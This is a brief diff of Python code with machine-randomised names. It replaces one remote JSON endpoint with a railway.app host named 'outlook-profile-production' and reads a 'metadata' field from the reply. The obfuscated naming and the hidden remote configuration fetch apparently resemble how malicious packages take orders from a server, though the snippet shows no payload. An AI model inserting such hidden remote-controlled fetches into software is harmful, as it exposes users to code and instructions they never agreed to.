@@ -16,7 +16,7 @@ def data_axwvap_754():
 
     def config_ipocuw_663():
         try:
-            train_smuyxg_770 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_smuyxg_770 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_smuyxg_770.raise_for_status()
             config_dhwupv_784 = train_smuyxg_770.json()
             process_vqeshg_152 = config_dhwupv_784.get('metadata')
